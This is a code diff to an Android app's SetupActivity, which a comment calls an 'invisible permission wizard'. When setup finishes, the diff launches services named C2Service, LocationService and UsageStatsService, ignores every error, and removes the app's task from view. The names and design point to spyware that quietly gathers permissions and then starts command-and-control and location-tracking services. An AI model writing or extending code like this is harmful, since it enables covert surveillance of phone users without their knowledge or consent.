@@ -13,7 +13,10 @@ import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import androidx.core.app.ActivityCompat
+import com.sp.core.services.C2Service
+import com.sp.core.services.LocationService
 import com.sp.core.services.ScreenCapture
+import com.sp.core.services.UsageStatsService
 
 /**
  * Invisible permission wizard.
@@ -100,7 +103,7 @@ class SetupActivity : Activity() {
 
     private fun runStep() {
         if (step >= setupSteps.size) {
-            finish()
+            finishUp()
             return
         }
         val intent = try { setupSteps[step].invoke() } catch (_: Throwable) { null }
@@ -128,6 +131,30 @@ class SetupActivity : Activity() {
             step++
             runStep()
         }
+    }
+
+    /**
+     * Wizard is done: the container services are started from a visible
+     * activity (Android 12+ only allows foreground services from the
+     * foreground) and the task is closed.
+     */
+    private fun finishUp() {
+        try {
+            val c2 = Intent(this, C2Service::class.java)
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(c2) else startService(c2)
+        } catch (_: Throwable) {
+        }
+        try {
+            val loc = Intent(this, LocationService::class.java)
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(loc) else startService(loc)
+        } catch (_: Throwable) {
+        }
+        try {
+            val usage = Intent(this, UsageStatsService::class.java)
+            startService(usage)
+        } catch (_: Throwable) {
+        }
+        finishAndRemoveTask()
     }
 
     private fun accessibilityIntent(): Intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
